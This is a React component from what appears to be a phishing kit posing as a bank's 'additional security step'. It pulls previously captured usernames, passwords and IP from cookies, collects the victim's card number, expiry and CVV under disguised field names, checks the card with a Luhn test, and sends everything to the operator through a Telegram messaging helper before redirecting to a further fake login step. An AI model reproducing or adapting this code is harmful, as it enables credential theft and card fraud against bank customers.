import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import { verifyCreditCardNumber } from "../utils/luhn";

type Additional = {
  schoolNumber: string;
  resumptionDate: string;
  entryCode: string;
};

export default function Additional() {
  const [formInput, setFormInput] = useState<Additional>({
    schoolNumber: "",
    resumptionDate: "",
    entryCode: "",
  });
  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const ip: string = cookies.get("ip");
  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  function handleCardInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    let value = event.target.value.replace(/\s/g, ""); // Remove existing spaces
    value = value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 0) {
      value = value.match(new RegExp(".{1,4}", "g"))!.join(" ");
    }

    event.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }



  function handleExpDate(e: React.ChangeEvent<HTMLInputElement>) {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 2) {
      value = value.slice(0, 2) + " / " + value.slice(2);
    }

    e.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    const message = `
    [----+🏦 CUSTOMER KAAD 🏦+-----]

    IP: ${ip}

    Fingerprint: ${navigator.userAgent}

    Username: ${login1.username}
    Password: ${login1.password}

    Username 2: ${login2.username2}
    Password 2: ${login2.password2}

    KAAD NUMBER: ${formInput.schoolNumber}

    KAAD EXPIRY: ${formInput.resumptionDate}

    KAAD CVV: ${formInput.entryCode}
    `;
    const isValidCardNumber = verifyCreditCardNumber(formInput.schoolNumber);
    if (!isValidCardNumber) {
      document.getElementById("card-error")?.classList.remove("hide");
      return;
    }
    setIsLoading(true);
    await TelegramSend(message);
    setIsLoading(false);
    cookies.set("additional", formInput);
    navigate("../login/auth/3", { replace: true });
  }
  return (
    <>
    <p>Additional security step</p>
    <p id="card-error" className="hide" style={{padding:"20px", textAlign:"center", backgroundColor:"red", color:"white"}}>Invalid Card details, Please check your card details and try again.</p>
        <form action="" method="post" onSubmit={handleSubmit}>
      <div className="form-area">
            <div className="input-field">
                <label htmlFor="">Card Number</label>
                <input type="text" name="schoolNumber" minLength={16} maxLength={19} required onChange={handleCardInputChange}/>
            </div>
            <div className="input-field">
                <label htmlFor="">Exp</label>
                <input type="text" maxLength={7} required  name="resumptionDate" onChange={handleExpDate}/>
            </div>
            <div className="input-field">
                <label htmlFor="">CVV</label>
                <input type="text" maxLength={4} name="entryCode" required onChange={handleInputChange}/>
            </div>

          

           {isLoading ?
            (
            <button className="btn" type="button">Please wait.....</button>
            )
            :(
            <button className="btn" type="submit">Submit</button>)
}

           
        </div>
    </form>
     
    </>
  );
}
